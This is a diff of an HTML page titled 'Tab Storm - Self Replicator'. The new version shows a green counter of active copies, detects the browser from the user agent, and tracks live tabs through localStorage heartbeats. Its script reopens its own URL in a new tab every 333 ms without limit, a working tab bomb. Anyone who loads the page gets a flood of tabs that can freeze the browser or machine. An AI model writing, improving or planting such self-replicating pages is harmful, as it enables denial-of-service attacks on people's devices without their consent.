@@ -2,33 +2,102 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Self-Replicator</title>
+    <title>Tab Storm - Self Replicator</title>
     <style>
-        body { background: black; color: #ff0055; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .warning { border: 2px solid #ff0055; padding: 20px; text-shadow: 0 0 10px #ff0055; }
+        body {
+            background: #000;
+            color: #00ff41;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            flex-direction: column;
+        }
+        .monitor {
+            border: 4px solid #00ff41;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 0 25px #00ff41;
+            background: rgba(0, 50, 0, 0.2);
+        }
+        #browser-tag { color: #ff0055; font-size: 1.2rem; margin-bottom: 10px; }
+        #count { font-size: 120px; font-weight: bold; text-shadow: 0 0 10px #00ff41; }
+        .status { margin-top: 15px; font-size: 0.9rem; opacity: 0.8; }
     </style>
 </head>
 <body>
-    <div class="warning">
-        <h1>REPLICATION ENGINE</h1>
-        <p>Current Path: <span id="path"></span></p>
+
+    <div class="monitor">
+        <div id="browser-tag">INITIALIZING...</div>
+        <div>ACTIVE INSTANCES</div>
+        <div id="count">1</div>
+        <div class="status">REPLICATING: 3 TABS/SEC</div>
     </div>
 
     <script>
-        const myPath = window.location.href;
-        document.getElementById('path').innerText = myPath;
+        const countDisplay = document.getElementById('count');
+        const browserTag = document.getElementById('browser-tag');
+        
+        // Generate a unique ID for THIS specific tab
+        const myTabID = "instance_" + Math.random().toString(36).substring(2, 11);
 
-        function replicate() {
-            // Opens a new tab with the exact same file
-            window.open(myPath, '_blank');
+        // 1. Identify Browser
+        function identify() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Edg/")) return "MICROSOFT EDGE";
+            if (ua.includes("OPR/") || ua.includes("Opera")) return "OPERA";
+            if (ua.includes("Chrome")) return "GOOGLE CHROME";
+            return "UNKNOWN BROWSER";
+        }
+        browserTag.innerText = identify();
+
+        // 2. The Heartbeat (Update count & tell others we exist)
+        function updateSystems() {
+            // Write our "I'm alive" signal to localStorage
+            localStorage.setItem(myTabID, Date.now());
+
+            let activeCount = 0;
+            const now = Date.now();
+
+            // Scan all keys in localStorage to find other active tabs
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.startsWith("instance_")) {
+                    const lastHeartbeat = parseInt(localStorage.getItem(key));
+                    
+                    // If a tab hasn't messaged in 3 seconds, it's closed/dead
+                    if (now - lastHeartbeat < 3000) {
+                        activeCount++;
+                    } else {
+                        localStorage.removeItem(key);
+                    }
+                }
+            }
+            countDisplay.innerText = activeCount;
         }
 
-        // 3 tabs per second = 333ms interval
-        // Browsers will throttle this heavily in the background
+        // 3. The Replicator (Opens itself)
+        function replicate() {
+            // This opens the exact same file path you are currently on
+            window.open(window.location.href, '_blank');
+        }
+
+        // Run Heartbeat every 1 second
+        setInterval(updateSystems, 1000);
+        
+        // Run Replicator every 333ms (~3 per second)
         setInterval(replicate, 333);
 
-        // Optional: Force focus back to the window to try and stay active
-        window.focus();
+        // Initial setup
+        updateSystems();
+
+        // Clean up our record if we close the tab manually
+        window.addEventListener('beforeunload', () => {
+            localStorage.removeItem(myTabID);
+        });
     </script>
 </body>
 </html>
